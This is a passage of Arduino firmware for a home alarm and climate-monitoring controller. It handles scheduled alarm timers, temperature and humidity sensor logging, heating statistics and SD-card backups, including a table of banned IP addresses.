#ifdef D_2WGApp
#else
        digitalWrite(DC_AlarmBuzzerPin, LOW);
#endif
      }
      else {
        digitalWrite(DC_AlarmOnLEDPin, HIGH);
#ifdef D_2WGApp
#else
        if (G_PIRLEDTimer != 0)
          digitalWrite(DC_AlarmBuzzerPin, HIGH);
        //
#endif
      }
      G_AlarmOnLEDFlashTimer = millis();
    }
  }
  else { //Alarm is OFF
    digitalWrite(DC_AlarmOnLEDPin, LOW);
#ifdef D_2WGApp
#else
    digitalWrite(DC_AlarmBuzzerPin, LOW);
#endif
  }

  //Switch the alarm on and off according to the user's schedule
  //If the alarm has been manually turned on or off the schedule will kick in on time
  //To force the alarm to stay on or off you need to change the alarm mode off Automatic
  if (EPSR(E_Alarm_Automation_7) == "F") {
    Pop(c_proc_num);
    return;
  }
  unsigned long l_today = Date();
  unsigned long l_now   = Now();
  byte l_day = DayOfWeekNum(l_today);
  for (byte l_idx = 0; l_idx < DC_AlarmTimerCount; l_idx++) {
    if (G_AlarmTimerList[l_idx].DayOfWeekNum == l_day) {
      unsigned long l_start = l_today + G_AlarmTimerList[l_idx].StartTime;
      unsigned long l_end = l_today + G_AlarmTimerList[l_idx].EndTime;
      //Action when equal or greater than and unactioned
      if ((l_start <= l_now) && (G_AlarmTimerList[l_idx].StartActioned == false)) {
        G_PremisesAlarmActive = true;
        G_AlarmTimerList[l_idx].StartActioned = true;
        ActivityWrite(EPSR(E_Auto_Alarm_ON_162));
      }
      if ((l_end <= l_now) && (G_AlarmTimerList[l_idx].EndActioned == false)) {
        G_PremisesAlarmActive = false;
        G_AlarmTimerList[l_idx].EndActioned = true;
        ActivityWrite(EPSR(E_Auto_Alarm_OFF_163));
      }
    } //ignore records not for today
  } //for each alarm time record
  CheckRAM();
  Pop(c_proc_num);
} //ProcessAlarmTimerActions

//----------------------------------------------------------------------------------------

boolean LoadAlarmTimesSPIBA() {
  //SPIDeviceSelect(DC_SDCardSSPin);    - Set before the call
  //SPIDeviceSelect(DC_EthernetSSPin);  - Reset after the call

  const byte c_proc_num = 42;
  Push(c_proc_num);
  //Initialise the array to Nulls/Zeros/False
  for (byte l_idx = 0; l_idx < DC_AlarmTimerCount; l_idx++) {
    G_AlarmTimerList[l_idx].DayOfWeekNum = 0;
    G_AlarmTimerList[l_idx].StartTime = 0;
    G_AlarmTimerList[l_idx].StartActioned = false;
    G_AlarmTimerList[l_idx].EndTime = 0;
    G_AlarmTimerList[l_idx].EndActioned = false;
  }
  CheckRAM();
  //Read file line by line and load into the array
  String l_filename = EPSR(E_ALRMTIMEdtTXT_160);
  if (!SD.exists(&l_filename[0])) {
    Pop(c_proc_num);
    return false;
  }
  File l_file = SD.open(&l_filename[0], FILE_READ);
  if (!l_file) {
    Pop(c_proc_num);
    return false;
  }
  CheckRAM();
  String l_line;
  String l_field;
  int l_idx = 0;
  int l_posn;
  //Consider moving this to a sub procedure to minimise fragmentation associated with l_line.
  while (l_file.available() != 0) {
    l_line = l_file.readStringUntil('\n');
    l_line.trim();
    l_posn = 0;
    l_field = ENDF2(l_line, l_posn, '\t');
    G_AlarmTimerList[l_idx].DayOfWeekNum = 0; //D
    if (l_field == "MON")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 1;
    else if (l_field == "TUE")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 2;
    else if (l_field == "WED")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 3;
    else if (l_field == "THU")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 4;
    else if (l_field == "FRI")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 5;
    else if (l_field == "SAT")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 6;
    else if (l_field == "SUN")
      G_AlarmTimerList[l_idx].DayOfWeekNum = 7;
    //
    if (G_AlarmTimerList[l_idx].DayOfWeekNum != 0) {
      l_field = ENDF2(l_line, l_posn, '\t');
      if (l_field != "")
        G_AlarmTimerList[l_idx].StartTime = TimeExtract(l_field);
      //
      l_field = ENDF2(l_line, l_posn, '\t');
      if (l_field != "")
        G_AlarmTimerList[l_idx].EndTime = TimeExtract(l_field);
      //
      l_idx++;
      if (l_idx == DC_AlarmTimerCount) {
        l_file.close();
        Pop(c_proc_num);
        return true;
      }
    } //skip invalid days
  } //read alarm time text file line by line
  CheckRAM();
  l_file.close();
  Pop(c_proc_num);
  return true;
} //LoadAlarmTimesSPIBA

//----------------------------------------------------------------------------------------

void AlarmActivate() { //Switch Off or On
  //Prior to calling this procedure we ensure that it is called
  //only from a local LAN or a Password logged in user seesion
  const byte c_proc_num = 43;
  Push(c_proc_num);
  G_PremisesAlarmActive = !G_PremisesAlarmActive;
  if (G_PremisesAlarmActive) {
#ifdef D_2WGApp
    G_GarageDoorActive = false;
#endif
    ActivityWrite(EPSR(E_Alarm_Activated_44));
  }
  else
    ActivityWrite(EPSR(E_Alarm_Deactivated_45));
  //
  CheckRAM();
  Pop(c_proc_num);
} //AlarmActivate

//----------------------------------------------------------------------------------------
//CLIMATE FUNCTIONALITY
//----------------------------------------------------------------------------------------

void FiveMinuteCheck() {
  //This does multiple functions:
  //A. Five minute updates of daily MIN and MAX temps and humidity
  //B. Resets Local Web Page Numbers
  const byte c_proc_num = 104;
  Push(c_proc_num);
  if (!CheckSecondsDelay(G_Climate_Range_Check_Timer, C_OneMinute * 5)) {
    Pop(c_proc_num);
    return;
  }
  G_Climate_Range_Check_Timer = millis();

  //Update todays climate range every five minutes
  ClimateRangeCheck();

  //Every fivute minutes we capture the heat resource if the air pump is operating.
  //The allows us to calculate an average heating resource
  if (G_AirPumpEnabled) {
    int l_heat_res;
    int l_front_door_temp;
    int l_outside_temp;
    int l_outside_hum;
    if (CalculateHeatResource(l_heat_res, l_front_door_temp, l_outside_temp, l_outside_hum)) {
      //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
      //For the heat resource difference no 35 degree downshift reqd
      //Ignore any errors - the averaging calculation with however become wrong
      int l_set;
      if (l_heat_res > 0)
        l_set = DC_HEAT;
      else
        l_set = DC_COOL;
      //
      G_HeatingSet[l_set][0].Resource += (l_heat_res + 350); //Force back to standard Ardy values
      G_HeatingSet[l_set][0].ResourceCount++;
    }
  }

  CheckRAM();
  Pop(c_proc_num);
} //FiveMinuteCheck

//----------------------------------------------------------------------------------------

void ClimateProcess() {
  const byte c_proc_num = 44;
  Push(c_proc_num);
  //This does multiple functions:
  //A. Captures climate data at the changeover of the climate periods
  //B. Backs up all memory arrays at the changeover of the climate periods
  //C. Performs midnight rollover of daily statistic counters
  //As well as initiating periodic climate updates this proc
  //also actions midnight update activities

  CheckRAM();

  //If the time period not elapsed then return
  //G_NextClimateUpdateTime only records time - there is no date portion
  long l_time = Now() % 100000;
  //We have a special test for the time rolling past midnight
  if (G_NextClimateUpdateTime == 100000) {
    if (l_time > 90000) {
      Pop(c_proc_num);
      return; //time has not rolled past midnight
    }
  }
  else if (l_time < G_NextClimateUpdateTime) { //Now apply the general test (time only comparison)
    Pop(c_proc_num);
    return;
  }

  //If just after midnight force a new ACTV daily file with the date as the first record
  //and perform other once per day reporting and activities.
  //We refresh the clock!
  if (G_NextClimateUpdateTime == 100000) {
    ActivityWrite(String(EPSR(E_Dateco__137) + DateToString(Date())));

    if (G_EthernetOK) ActivityWrite(EPSR(E_Ethernet_OK_14));
    else              ActivityWrite(Message(M_Ethernet_Failure_1));

    if (G_SDCardOK) ActivityWrite(EPSR(E_SD_Card_OK_15));
    else            ActivityWrite(EPSR(E_SD_Card_Failure_16));

#ifdef D_2WGApp
    if (G_GarageDoorActive) ActivityWrite(EPSR(E_Garage_Door_Web_Active_22));
    else                    ActivityWrite(EPSR(E_Garage_Door_Web_Disabled_23));
#endif

  }

  //Record the status of our www ethernet sockets in the activity logs
  //ListSocketStatus();

  //By using consecutive pins for the DHT111 and two dimensional arrays
  //we could use iteration here to minimise the code substantially.
  //OK - we are past a 15 minute break
  ClimateUpdate();
  //The backup is after the date has been shuffled along and we have captured
  //current temp and humidity in the current hour (col 0) of the arrays.
  MemoryBackup();
  CheckRAM();

  if (G_NextClimateUpdateTime == 100000) {
    MidnightRollover();
    WriteDailyClimateRecord();
    CheckRAM();
    ClimateSensorCheck();
  }

  //And rollover to the next climate check
  G_NextClimateUpdateTime = CalcNextClimateCheck();
  CheckRAM();
  Pop(c_proc_num);
} //ClimateProcess

//----------------------------------------------------------------------------------------

void InitClimateArrays(int p_minute_period, boolean p_clear_week_history, boolean p_activity_msg) {
  //Called during setup() and whenever we change the length of the climate periods
  const byte c_proc_num = 45;
  Push(c_proc_num);
  //Initialise our temp and humidity statistic a
  G_Climate_Range_Check_Timer = millis(); //update daily climate range every minute
  G_Periods_Per_Day = (24 * 60) / p_minute_period;
  G_NextClimateUpdateTime = CalcNextClimateCheck();
  for (byte l_count = 0; l_count < DC_SensorCountTemp; l_count++) {
    //Clear the 12 period recent history array
    for (byte l_index = 0; l_index < DC_ClimatePeriodCount; l_index ++) {
      G_ArrayTemp[l_count].TempPeriodic[l_index] = 0;
      if (l_count < DC_SensorCountHum)
        G_ArrayHum[l_count].HumPeriodic [l_index] = 0;
      //
    }
    if (p_clear_week_history == true) {
      //Clear the previous temperature setting
      //Clear the seven day climate history record
      for (byte l_index = 0; l_index < DC_WeekDayCount; l_index ++) {
        G_ArrayTemp[l_count].TempMax[l_index] = 0;
        G_ArrayTemp[l_count].TempMin[l_index] = 1000;
        if (l_count < DC_SensorCountHum) {
          G_ArrayHum[l_count].HumMax[l_index] = 0;
          G_ArrayHum[l_count].HumMin[l_index] = 1000;
        }
      }
    }
  }
  if (p_activity_msg)
    ActivityWrite(String(EPSR(E_Climate_Period_Set__30) + String(p_minute_period)));
  //
  CheckRAM();
  Pop(c_proc_num);
} //InitClimateArrays

//----------------------------------------------------------------------------------------

void InitMemoryArrays(int p_minute_period, boolean p_clear_week_history, boolean p_activity_msg) {
  //Called during setup()
  const byte c_proc_num = 90;
  Push(c_proc_num);

  //First initialise the climate arrays
  InitClimateArrays(p_minute_period, p_clear_week_history, p_activity_msg);

  //Now initialise other memory arrays prior to the reload

  //Statistic Count Array
  ResetStatisticsCounts(true); //reset month and days stats before startup reload

  //initialise the hacker list
  for (byte l_count = 0; l_count < DC_FailedHTMLRequestListCount; l_count++) {
    for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++)
      G_FailedHTMLRequestList[l_count].IPAddress[l_idx] = 0;
    //
    G_FailedHTMLRequestList[l_count].BanType[0] = '\0';
    G_FailedHTMLRequestList[l_count].LastDateTime = 0;
    G_FailedHTMLRequestList[l_count].AttemptCount = 0;
  };

#ifdef D_2WGApp
  //Initialise the Air Pump mode record
  for (byte l_index = 0; l_index < DC_ClimatePeriodCount; l_index ++)
    G_AirPumpModes[l_index] = 0;  //OFF
  //
#endif

#ifdef D_2WGApp
  for (byte l_set = 0; l_set < DC_HeatingSetCount; l_set ++) { //HEAT and COOL
    for (byte l_day = 0; l_day < DC_WeekDayCount; l_day++) { //Days of week
      G_HeatingSet[l_set][l_day].Duration = 0;
      G_HeatingSet[l_set][l_day].Baseline = 0;
      G_HeatingSet[l_set][l_day].Benefit  = 0;
      G_HeatingSet[l_set][l_day].Resource = 0;
      G_HeatingSet[l_set][l_day].ResourceCount = 0;
    }
  }
#endif

  CheckRAM();
  Pop(c_proc_num);
} //InitMemoryArrays

//----------------------------------------------------------------------------------------

void ClimateRangeCheck() {
  //Currently this is evaluated every five minutes
  //Update today's max and mins
  const byte c_proc_num = 46;
  Push(c_proc_num);
  int l_temp, l_hum = 0;
  //We don't extract new DHT readings until at least two seconds after any previous readings
  while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
  }//Do Nothing
  G_DHTDelayTimer = millis();
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    if (DHTRead(l_sensor, l_temp, l_hum) == DHTLIB_OK) {
      if (G_ArrayTemp[l_sensor].TempMin[0] > l_temp)
        G_ArrayTemp[l_sensor].TempMin[0] = l_temp;
      //
      if (G_ArrayTemp[l_sensor].TempMax[0] < l_temp)
        G_ArrayTemp[l_sensor].TempMax[0] = l_temp;
      //
      if (l_sensor < DC_SensorCountHum) {
        if (G_ArrayHum[l_sensor].HumMin[0] > l_hum)
          G_ArrayHum[l_sensor].HumMin[0] = l_hum;
        //
        if (G_ArrayHum[l_sensor].HumMax[0] < l_hum)
          G_ArrayHum[l_sensor].HumMax[0] = l_hum;
        //
      }
    } //ignore invalid readings
    //We use a delay in an attempt to minimise possible sesnor reading errors
    //We have seen instances where 4th sensor TempMax readings are missed.
    //delay(100);
  } //for each sensor
  CheckRAM();
  Pop(c_proc_num);
} //ClimateRangeCheck

//----------------------------------------------------------------------------------------

void ClimateUpdate() {
  const byte c_proc_num = 47;
  Push(c_proc_num);
  //Shuffle the climate periodic array along
  //Record current climate values

  /*
    struct TypeRAMData {
    int    CheckPoint;
    int    ParentProcedure;
    long   TimeOfDay;
    int    Value;
    String HeapFreeList;
    boolean Updated;
    };
    #define DC_RAMDataCount   5
    #define DC_RAMDataSize    0
    #define DC_RAMStackSize   1
    #define DC_RAMHeapSize    2
    #define DC_RAMMinFree     3
    #define DC_RAMHeapMaxFree 4
    TypeRAMData G_RAMData[DC_RAMDataCount];
  */

  //In a climate update we also capture current free ram
  int l_data_size;
  int l_heap_size;
  int l_stack_size;
  int l_ram_free;
  int l_heap_free;
  int l_heap_list_sizes[DC_HeapListCount];
  RamUsage(l_data_size, l_heap_size, l_ram_free, l_stack_size, l_heap_free, l_heap_list_sizes);

  ActivityWrite(EPSR(E_Climate_Update_67));
  ActivityWrite(EPSR(E_hy_Free_RAMco__288) + String(l_ram_free));
  ActivityWrite("- UPS Battery Voltage: " + FormatAmt(GetUPSBatteryVoltage(), 1));
  if (EPSR(E_Periodic_RAM_Reporting_6) == C_T) {
    //When periodic RAM reporting is off we report each change over 24 hours
    //For periodic reporting we report the stats at the end of each cycle
    for (byte l_idx = 0; l_idx < DC_RAMDataCount; l_idx ++) {
      WriteSRAMStatisticSPICSC2(l_idx);
    } //for each memory statistic
    ResetSRAMStatistics();
  }
  CheckRAM();

  int l_temp, l_hum = 0;
  //We don't extract new DHT readings until at least two seconds after any previous readings
  while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
  }//Do Nothing
  G_DHTDelayTimer = millis();
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    //Shuffle the climate periodic array along
    for (byte l_index = (DC_ClimatePeriodCount - 1); l_index > 0; l_index--) {
      G_ArrayTemp[l_sensor].TempPeriodic[l_index] = G_ArrayTemp[l_sensor].TempPeriodic[l_index - 1];
      if (l_sensor < DC_SensorCountHum)
        G_ArrayHum[l_sensor].HumPeriodic [l_index]  = G_ArrayHum[l_sensor].HumPeriodic [l_index - 1];
      //
    }

    //Record current climate values
    DHTRead(l_sensor, l_temp, l_hum);
    //Will be zero (NULL) defaults if there was a sensor read error (three times)
    G_ArrayTemp[l_sensor].TempPeriodic[0] = l_temp;
    if (l_sensor < DC_SensorCountHum)
      G_ArrayHum[l_sensor].HumPeriodic [0] = l_hum;
    //

  } //for each sensor

#ifdef D_2WGApp
  //Shuffle the Air Pump record
  for (byte l_index = (DC_ClimatePeriodCount - 1); l_index > 0; l_index--)
    G_AirPumpModes[l_index] = G_AirPumpModes[l_index - 1];
  //
  //Capture the current air pump mode
  int l_heat_res;
  int l_hallway_temp;
  int l_outside_temp;
  int l_outside_hum;
  //We assume a complete result
  CalculateHeatResource(l_heat_res, l_hallway_temp, l_outside_temp, l_outside_hum);
  //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
  //For the heat resource difference no 35 degree downshift reqd
  if (G_AirPumpEnabled == false) //OFF
    G_AirPumpModes[0] = 0;
  else if (l_heat_res > 0)
    G_AirPumpModes[0] = 1;
  else
    G_AirPumpModes[0] = 255; //-1;
  //
#endif

  CheckRAM();
  Pop(c_proc_num);
} //ClimateUpdate

//----------------------------------------------------------------------------------------

String DetermineStatType(int p_periods_per_day) {
  const byte c_proc_num = 48;
  Push(c_proc_num);
  if (p_periods_per_day == 12) {
    Pop(c_proc_num);
    return "120MN";
  }
  else if (p_periods_per_day == 24) {
    Pop(c_proc_num);
    return "60MN";
  }
  else if (p_periods_per_day == 48) {
    Pop(c_proc_num);
    return "30MN";
  }
  else if (p_periods_per_day == 96) {
    Pop(c_proc_num);
    return "15MN";
  }
  else {
    Pop(c_proc_num);
    return "5MN";
  }
  //
} //DetermineStatType

//----------------------------------------------------------------------------------------

void MemoryBackup() {
  const byte c_proc_num = 49;
  Push(c_proc_num);
  //Write statistical data to an SD card backup file

  CheckRAM();
  if (!G_SDCardOK) {
    ActivityWrite(Message(M_SD_Card_Error_hy_Climate_Recording_Skipped_28));
    Pop(c_proc_num);
    return;
  }

  int l_dd, l_mm, l_yyyy, l_hh, l_mn = 0;
  long l_date_period = Date() + G_NextClimateUpdateTime;
  TimeDecode(Now(), &l_hh, &l_mn);
  //If we are just after midnight (a second or less) "Date()" returns the new day.
  //However for a midnight backup we must subtract one day because the midnight
  //climate update time of 100,000 adds an extra day to the backup filename.
  if ((G_NextClimateUpdateTime == 100000) &&
      (l_hh == 0) && (l_mn < 2))
    l_date_period -= 100000;
  //
  DateDecode(l_date_period, &l_dd, &l_mm, &l_yyyy);
  TimeDecode(l_date_period, &l_hh, &l_mn);
  String l_directory   = String(EPSR(E_BACKUPSsl_135) + ZeroFill(l_yyyy, 4) + "/" + ZeroFill(l_mm, 2) + "/" + ZeroFill(l_dd, 2) );
  String l_SD_filename = String(l_directory + "/" + ZeroFill(l_mm, 2) + ZeroFill(l_dd, 2) + ZeroFill(l_hh, 2) + ZeroFill(l_mn, 2) + ".TXT");

  SPIDeviceSelect(DC_SDCardSSPin);
  SD.mkdir(&l_directory[0]);
  //Delete any existing file
  //This relates to the daylight saving windback when we do not want
  //backup data appended to an existing backup file from one hour previously.
  String l_msg = "";
  SDFileDeleteSPICSC(l_SD_filename, l_msg);

  File l_SD_file = SD.open(&l_SD_filename[0], FILE_WRITE);
  if (!l_SD_file) {
    ActivityWrite(String(Message(M_File_Open_Error__17) + l_SD_filename));
    SPIDeviceSelect(DC_EthernetSSPin);
    Pop(c_proc_num);
    return;
  }

  CheckRAM();
  String l_period = String(DetermineStatType(G_Periods_Per_Day) + '\t');

  //First we backup the period stats for each sensor
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    l_SD_file.print(l_period);
    l_SD_file.print(C_SensorList[l_sensor]);
    l_SD_file.print(F("\tTemp"));
    for (int l_index = DC_ClimatePeriodCount - 1; l_index >= 0; l_index--) {
      l_SD_file.print('\t');
      l_SD_file.print(TemperatureToString(C_SensorDHT11[l_sensor], G_ArrayTemp[l_sensor].TempPeriodic[l_index], false));
    }
    l_SD_file.println();

    //Skip lines where humidity is not tracked
    if (l_sensor < DC_SensorCountHum) {
      l_SD_file.print(l_period);
      l_SD_file.print(C_SensorList[l_sensor]);
      l_SD_file.print(F("\tHumidity"));
      for (int l_index = (DC_ClimatePeriodCount - 1); l_index >= 0; l_index--) {
        if (G_ArrayHum[l_sensor].HumPeriodic[l_index] == 0)
          l_SD_file.print(F("\tNULL"));
        else {
          l_SD_file.print('\t');
          l_SD_file.print(HumidityToString(l_sensor, G_ArrayHum[l_sensor].HumPeriodic[l_index]));
        }
      }
      l_SD_file.println();
    }
  }

  CheckRAM();
  //Now we backup the daily maximum and minimum climate stats
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    for (byte l_count = 1; l_count <= 4; l_count++) {
      String l_stat = EPSR(E_NULL_123);
      int* l_row; //a pointer to an integer row of stats
      switch (l_count) {
        case 1:
          l_stat = EPSR(E_tbTemptbMax_131);
          l_row = G_ArrayTemp[l_sensor].TempMax;
          break;
        case 2:
          l_stat = EPSR(E_tbTemptbMin_132);
          l_row = G_ArrayTemp[l_sensor].TempMin;
          break;
        case 3:
          if (l_sensor < DC_SensorCountHum) {
            l_stat = EPSR(E_tbHumiditytbMax_133);
            l_row = G_ArrayHum[l_sensor].HumMax;
          }
          break;
        case 4:
          if (l_sensor < DC_SensorCountHum) {
            l_stat = EPSR(E_tbHumiditytbMin_134);
            l_row = G_ArrayHum[l_sensor].HumMin;
          }
          break;
      } //switch

      if (l_stat != EPSR(E_NULL_123)) {
        l_SD_file.print(F("DAY\t"));
        l_SD_file.print(C_SensorList[l_sensor]);
        l_SD_file.print(l_stat);
        for (int l_day = (DC_WeekDayCount - 1); l_day >= 0; l_day--) {
          l_SD_file.print('\t');
          if (l_count < 3) //1 & 2 is temp
            l_SD_file.print(TemperatureToString(C_SensorDHT11[l_sensor], l_row[l_day], false));
          else //3 & 4 is humidity
            l_SD_file.print(HumidityToString(l_sensor, l_row[l_day]));
          //
        } //for each day of the last week
        l_SD_file.println();
      }
    } //for each stat - TEMP/HUM, HIGH/LOW
  } //for each sensor

#ifdef D_2WGApp
  //Finally the Air Pump stats
  l_SD_file.print(F("AIRPUMP"));
  for (int l_index = DC_ClimatePeriodCount - 1; l_index >= 0; l_index--) {
    l_SD_file.print('\t');
    l_SD_file.print(G_AirPumpModes[l_index]);
  }
  l_SD_file.println();
#endif

  String l_filename = EPSR(E_STATSdtTXT_286);
  File l_stats_file;
  boolean l_stats_file_OK = true;
  if (!SD.exists(&l_filename[0]))
    l_stats_file_OK = false;
  else {
    l_stats_file = SD.open(&l_filename[0], FILE_READ);
    if (!l_stats_file)
      l_stats_file_OK = false;
    //
  }

  for (byte l_index2 = 0; l_index2 < DC_StatisticsCount; l_index2 ++) {
    l_SD_file.print(F("STAT\t"));
    l_SD_file.print(l_index2);
    l_SD_file.print('\t');
    l_SD_file.print(G_StatActvMth[l_index2]);
    l_SD_file.print('\t');
    l_SD_file.print(G_StatActvDay[l_index2]);
    l_SD_file.print('\t');
    l_SD_file.println(DirectFileRecordRead(l_stats_file, 27, l_index2 + 1));
  }

  for (byte l_index2 = 0; l_index2 < G_CrawlerCount; l_index2 ++) {
    l_SD_file.print(F("CRWL\t"));
    l_SD_file.print(l_index2);
    l_SD_file.print('\t');
    l_SD_file.print(G_StatCrwlMth[l_index2]);
    l_SD_file.print('\t');
    l_SD_file.print(G_StatCrwlDay[l_index2]);
    l_SD_file.print('\t');
    l_SD_file.println(G_WebCrawlers[l_index2]);
  }

  //Close the direct file
  if (l_stats_file_OK == true) {
    l_stats_file.close();
  }

  //Now backup the banned IP address table
  for (byte l_ip = 0; l_ip < DC_FailedHTMLRequestListCount; l_ip++) {
    l_SD_file.print(F("IP\t"));

    l_SD_file.print(l_ip);
    l_SD_file.print('\t');

    l_SD_file.print(G_FailedHTMLRequestList[l_ip].IPAddress[0]);
    l_SD_file.print('\t');
    l_SD_file.print(G_FailedHTMLRequestList[l_ip].IPAddress[1]);
    l_SD_file.print('\t');
    l_SD_file.print(G_FailedHTMLRequestList[l_ip].IPAddress[2]);
    l_SD_file.print('\t');
    l_SD_file.print(G_FailedHTMLRequestList[l_ip].IPAddress[3]);
    l_SD_file.print('\t');

    l_SD_file.print(G_FailedHTMLRequestList[l_ip].BanType);
    l_SD_file.print('\t');


    if (G_FailedHTMLRequestList[l_ip].LastDateTime != 0) {
      l_SD_file.print(DateToString(G_FailedHTMLRequestList[l_ip].LastDateTime));
      l_SD_file.print('\t');
      l_SD_file.print(TimeToHHMMSS(G_FailedHTMLRequestList[l_ip].LastDateTime));
      l_SD_file.print('\t');
    }
    else {
      l_SD_file.print(0); //Date
      l_SD_file.print('\t');
      l_SD_file.print(0); //Time
      l_SD_file.print('\t');
    }

    l_SD_file.println(G_FailedHTMLRequestList[l_ip].AttemptCount);
  }; //Backup IP hacker list


  //Backup the heating/air pump statistics data
  //First we need to know if we are in heating or cooling mode
  boolean l_heat = true; //D
  if (G_AirPumpEnabled) {
    int l_heat_res;
    int l_front_door_temp;
    int l_outside_temp;
    int l_outside_hum;
    if (CalculateHeatResource(l_heat_res, l_front_door_temp, l_outside_temp, l_outside_hum)) {
      //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
      //For the heat resource difference no 35 degree downshift reqd
      if (l_heat_res < 0)
        l_heat = false;
      //
    }
  }

  for (int l_set = 0; l_set < DC_HeatingSetCount; l_set++) {
    String l_heat_type;
    if (l_set == DC_HEAT)
      l_heat_type = EPSR(E_HEATING_324);
    else
      l_heat_type = EPSR(E_COOLING_325);
    //

    //DURATION
    l_SD_file.print(l_heat_type);
    l_SD_file.print('\t');
    l_SD_file.print(F("DURATION"));
    l_SD_file.print('\t');
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      long l_duration = G_HeatingSet[l_set][l_day].Duration;
      //If Air Pump is running perform pseudo shut off
      if ((l_day == 0) && (G_AirPumpEnabled) &&
          (((l_set == 0) && (l_heat)) || ((l_set == 1) && (!l_heat)))
         )
        l_duration += long(Time());
      //
      l_SD_file.print(l_duration);
      if (l_day != (DC_WeekDayCount - 1))
        l_SD_file.print('\t');
      //
    }
    l_SD_file.println();

    //RESOURCE
    l_SD_file.print(l_heat_type);
    l_SD_file.print('\t');
    l_SD_file.print(F("RESOURCE"));
    l_SD_file.print('\t');
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      l_SD_file.print(G_HeatingSet[l_set][l_day].Resource);
      if (l_day != (DC_WeekDayCount - 1))
        l_SD_file.print('\t');
      //
    }
    l_SD_file.println();

    //RESOURCE COUNT
    l_SD_file.print(l_heat_type);
    l_SD_file.print('\t');
    l_SD_file.print(F("RESOURCECOUNT"));
    l_SD_file.print('\t');
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      l_SD_file.print(G_HeatingSet[l_set][l_day].ResourceCount);
      if (l_day != (DC_WeekDayCount - 1))
        l_SD_file.print('\t');
      //
    }
    l_SD_file.println();

    //BASELINE
    l_SD_file.print(l_heat_type);
    l_SD_file.print('\t');
    l_SD_file.print(F("BASELINE"));
    l_SD_file.print('\t');
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      long l_baseline = G_HeatingSet[l_set][l_day].Baseline;
      if ((l_day == 0) && (G_AirPumpEnabled) &&
          (((l_set == 0) && (l_heat)) || ((l_set == 1) && (!l_heat))) ) {
        int l_temp, l_hum = 0;
        if (DHTRead(C_Hallway_Sensor, l_temp, l_hum) == DHTLIB_OK)
          l_baseline += l_temp; //Standardise this temp difference
        else
          l_baseline = 0;
        //
      }
      l_SD_file.print(l_baseline);
      if (l_day != (DC_WeekDayCount - 1))
        l_SD_file.print('\t');
      //
    }
    l_SD_file.println();

    //BENEFIT
    l_SD_file.print(l_heat_type);
    l_SD_file.print('\t');
    l_SD_file.print(F("BENEFIT"));
    l_SD_file.print('\t');
    for (int l_day = 0; l_day < DC_WeekDayCount; l_day++) {
      long l_benefit = G_HeatingSet[l_set][l_day].Benefit;
      if ((l_day == 0) && (G_AirPumpEnabled) &&
          (((l_set == 0) && (l_heat)) || ((l_set == 1) && (!l_heat))) ) {
        int l_temp, l_hum = 0;
        if (DHTRead(C_Front_Door_Sensor, l_temp, l_hum) == DHTLIB_OK)
          l_benefit += l_temp; //Standardise this temp difference
        else
          l_benefit = 0;
        //
      }
      l_SD_file.print(l_benefit);
      if (l_day != (DC_WeekDayCount - 1))
        l_SD_file.print('\t');
      //
    }
    l_SD_file.println();
  } //HEATING STATS - HEAT and COOL

  CheckRAM();
  l_SD_file.close();

  SPIDeviceSelect(DC_EthernetSSPin);
  Pop(c_proc_num);
} //MemoryBackup

//----------------------------------------------------------------------------------------

void MidnightRollover() {
  const byte c_proc_num = 50;
  Push(c_proc_num);
  //Shuffle the 7 day array along
  //Initialise current day values
  //Write to daily historical log

  ActivityWrite(EPSR(E_Daily_Climate_Update_68));
  CheckRAM();
  int l_temp, l_hum = 0;
  //We don't extract new DHT readings until at least two seconds after any previous readings
  while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
  }//Do Nothing
  G_DHTDelayTimer = millis();
  for (byte l_sensor = 0; l_sensor < DC_SensorCountTemp; l_sensor++) {
    for (byte l_index = (DC_WeekDayCount - 1); l_index > 0; l_index--) {
      //Shuffle the 7 day array along
      G_ArrayTemp[l_sensor].TempMax[l_index] = G_ArrayTemp[l_sensor].TempMax[l_index - 1];
      G_ArrayTemp[l_sensor].TempMin[l_index] = G_ArrayTemp[l_sensor].TempMin[l_index - 1];
      if (l_sensor < DC_SensorCountHum) {
        G_ArrayHum[l_sensor].HumMax[l_index]  = G_ArrayHum[l_sensor].HumMax[l_index - 1];
        G_ArrayHum[l_sensor].HumMin[l_index]  = G_ArrayHum[l_sensor].HumMin[l_index - 1];
      }
    }
    //Initialise today's sensor values
    G_ArrayTemp[l_sensor].TempMax[0] = 0;
    G_ArrayTemp[l_sensor].TempMin[0] = 1000;
    if (l_sensor < DC_SensorCountHum) {
      G_ArrayHum[l_sensor].HumMax[0] = 0;
      G_ArrayHum[l_sensor].HumMin[0] = 1000;
    }

    //Read current sensor values to initialise today's values
    if (DHTRead(l_sensor, l_temp, l_hum) == DHTLIB_OK) {
      G_ArrayTemp[l_sensor].TempMax[0] = l_temp;
      G_ArrayTemp[l_sensor].TempMin[0] = l_temp;
      if (l_sensor < DC_SensorCountHum) {
        G_ArrayHum[l_sensor].HumMax[0] = l_hum;
        G_ArrayHum[l_sensor].HumMin[0] = l_hum;
      }
    }
  }

  if (EPSR(E_Periodic_RAM_Reporting_6) == "F") {
    ResetSRAMStatistics();
  }

  //ResetAlarmActions
  //Every midnight make all flags equal false
  for (byte l_idx = 0; l_idx < DC_AlarmTimerCount; l_idx++) {
    G_AlarmTimerList[l_idx].StartActioned = false;
